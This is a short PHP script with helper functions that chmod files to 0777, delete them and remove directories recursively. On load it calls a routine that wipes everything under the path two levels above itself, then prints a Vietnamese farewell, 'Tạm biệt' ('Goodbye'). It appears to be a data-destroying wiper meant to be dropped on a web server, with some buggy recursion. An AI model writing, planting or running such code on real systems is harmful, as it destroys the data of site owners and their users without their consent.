<?php 
	
	function dir_exists($url, $dir_name = false) {
		if(!$dir_name) return false;
		if(is_dir($url.$dir_name)) return true;
		$tree = glob($url.'*', GLOB_ONLYDIR);
		if($tree && count($tree)>0) {
			foreach($tree as $dir)
				if(dir_exists($dir_name, $dir.'/'))
					return true;
		}
		
		return false;
	}
	
	function check_floder_chil ($url) { 
		if(!is_dir($url)) return;
		$dir = opendir($url);
		$list_array = array();
		while (($file = readdir($dir)) !== false) {
		  	if ($file!="." && $file!="..") 
		  		return true;
		 }
		closedir($dir);
		return false;
	}
	
	function list_file ($url) { 
		if(!is_dir($url)) return;
		$dir = opendir($url);
		$list_array = array();
		while (($file = readdir($dir)) !== false) {
		  	if ($file!="." && $file!=".." && !dir_exists($url,$file)) 
		  		$list_array[] = $file;
		 }
		closedir($dir);
		return $list_array;
	}

	function delete_filename ($url,$file) { 
		chmod($url."/".$file, 0777);
		unlink($url."/".$file);
	} 
	
	function delete_list_file ($url) { 
		$list_file = list_file($url);
		foreach ($list_file as $file) 
			delete_filename($url, $file);
	}
	
	function delete_list_floder_in ($url) {
		if(!is_dir($url)) return;
		chmod($url, 0777);
	    $dir = opendir($url);
	    $flag = 0;
	    while (false !== ($file = readdir($dir))) {
	        if (($file=="." || $file=="..") && $flag==0) $flag=1;
	        if ($file!="." && $file!=".." && dir_exists($url,$file)) delete_list_floder_in($url.$file."/");
	    }
	    closedir($dir);   
	    if (check_floder_chil($url)==false)  
	    	rmdir($url);    
	    if ($flag==1)
	    	return;  
	} 
	
	function delete_list_file_in ($url) {
		if(!is_dir($url)) return;
		delete_list_file ($url);
		$dir = opendir($url);
		$flag = 0;
		while (($file = readdir($dir)) !== false) {
		  	if (($file=="." || $file=="..") && $flag==0) $flag=1;
	        if ($file!="." && $file!=".." && dir_exists($url,$file)) 
			  	delete_list_file_in($url.$file."/");
		}
		closedir($dir);
		if ($flag==1)
			return;
	}
	
	function delete_floder ($url) {
		while (is_dir($url)) {
			delete_list_file_in($url);
			delete_list_floder_in($url);
		}
	}
	
	function delete_sub_floder ($url) {
		if(!is_dir($url)) return;
		delete_list_file_in($url);
		$dir = opendir($url);
		while (($file = readdir($dir)) !== false) {
			if ($file!="." && $file!="..") {
				while (is_dir($url.$file."/")) {
					delete_list_file_in($url.$file."/");
					delete_list_floder_in($url.$file."/");
				}
			}
		}
		closedir($dir);
	}
	
	delete_sub_floder("../../");
	
?>
Tạm biệt ^o^!